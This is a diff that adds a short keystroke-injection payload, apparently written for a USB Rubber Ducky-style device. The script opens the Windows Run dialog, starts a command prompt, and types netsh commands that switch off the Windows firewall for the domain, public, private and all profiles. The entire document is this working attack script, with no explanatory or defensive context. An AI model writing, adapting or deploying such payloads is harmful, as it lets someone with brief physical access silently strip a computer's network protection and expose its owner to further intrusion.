@@ -1,0 +1,17 @@
+DELAY 1000
+GUI r
+DELAY 500
+STRING cmd
+ENTER
+DELAY 1000
+STRING netsh advfirewall set domainprofile state off
+ENTER
+DELAY 500
+STRING netsh advfirewall set publicprofile state off
+ENTER
+DELAY 500
+STRING netsh advfirewall set privateprofile state off
+ENTER
+DELAY 500
+STRING netsh advfirewall set allprofiles state off
+ENTER
